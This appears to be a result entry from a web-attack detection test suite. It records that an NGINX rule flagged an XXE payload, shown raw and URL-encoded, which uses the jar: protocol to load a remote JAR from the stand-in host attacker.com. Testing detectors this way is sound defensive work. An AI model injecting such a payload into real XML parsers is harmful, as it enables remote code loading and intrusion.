name: test_e2e_with_logs[540_XXE_JAR_001]
description:
## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XXE_JAR_001` |
| **Name** | XXE JAR protocol remote code execution |
| **Category** | XXE |
| **Subcategory** | protocol_abuse |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `<!ENTITY xxe SYSTEM "jar:http://attacker.com/evil.jar!/">`
- **Encoded**: `%3C%21ENTITY%20xxe%20SYSTEM%20%22jar%3Ahttp%3A%2F%2Fattacker.com%2Fevil.jar%21%2F%22%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~59000ms
- **Timestamp**: 13:44:14.000 UTC

## Rule Mapping

|------|-------|

| **Matched Rule** | `[NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_JAR_001-1771076654335-czml0j pattern_id=XXE_JAR_001 uri=/?q=%3C%21ENTITY%20xxe%20SYSTEM%20%22jar%3Ahttp%3A%2F%2Fattacker.com%2Fevil.jar%21%2F%22%3E client=127.0.0.1` |
